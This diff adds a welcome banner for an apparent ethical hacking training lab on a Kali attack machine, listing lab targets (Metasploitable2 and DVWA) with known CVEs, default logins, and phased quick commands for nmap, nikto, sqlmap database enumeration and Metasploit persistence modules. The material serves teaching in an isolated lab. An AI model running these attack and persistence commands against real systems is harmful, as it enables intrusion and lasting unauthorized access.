@@ -1,0 +1,56 @@
+
+ ██╗  ██╗ █████╗  ██╗      ██╗    ██╗  ██╗ █████╗  ██████╗  ██╗
+ ██║ ██╔╝██╔══██╗ ██║     ██╔╝    ██║  ██║██╔══██╗ ██╔══██╗ ██║
+ █████╔╝ ███████║ ██║    ██╔╝     ███████║███████║ ██████╔╝ ██║
+ ██╔═██╗ ██╔══██║ ██║   ██╔╝      ██╔══██║██╔══██║ ██╔══██╗ ██║
+ ██║  ██╗██║  ██║ ███████╗        ██║  ██║██║  ██║ ██████╔╝ ██║
+ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══════╝        ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═╝
+
+ MCCoE Ethical Hacking Lab  —  Kali Linux Attack Machine
+ ══════════════════════════════════════════════════════════════
+
+  YOUR IP ........... 172.20.0.10
+  YOUR NOTES ........ /root/lab/notes/
+  YOUR REPORTS ...... /root/lab/reports/
+  YOUR SCANS ........ /root/lab/scans/
+
+ TARGETS
+ ══════════════════════════════════════════════════════════════
+  172.20.0.20  METASPLOITABLE2    Colonial Pipeline / SolarWinds
+               Port 21   vsftpd 2.3.4    CVE-2011-2523
+               Port 445  Samba 3.0.20   CVE-2007-2447
+               Port 22   SSH (weak creds: msfadmin/msfadmin)
+               Port 80   Apache + DVWA
+
+  172.20.0.30  DVWA               Target Breach / Equifax
+               Port 80   Web app (login: admin/password)
+               Modules:  SQLi, CMDi, XSS, File Upload
+
+ QUICK COMMANDS
+ ══════════════════════════════════════════════════════════════
+  Phase 1 — Recon:
+    nmap -sn 172.20.0.0/24               (discover live hosts)
+    whois <domain>                        (domain intel)
+
+  Phase 2 — Scan:
+    nmap -sV -sC -O 172.20.0.20          (full service scan)
+    nikto -h http://172.20.0.30          (web vulnerability scan)
+
+  Phase 3 — Exploit:
+    msfconsole -q                         (launch Metasploit)
+    sqlmap -u "http://172.20.0.30/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<id>;security=low" --dbs
+
+  Phase 4 — Persistence:
+    (inside msfconsole after getting shell)
+    run post/linux/manage/sshkey_persistence
+    run post/multi/manage/shell_to_meterpreter
+
+  Phase 5 — Report:
+    Save your report to /root/lab/reports/
+    nano /root/lab/reports/pentest-report.txt
+
+ ══════════════════════════════════════════════════════════════
+ ALL TARGETS ARE AUTHORIZED FOR THIS LAB — ATTACK FREELY
+ NEVER USE THESE TOOLS OUTSIDE THIS DOCKER NETWORK
+ ══════════════════════════════════════════════════════════════
+
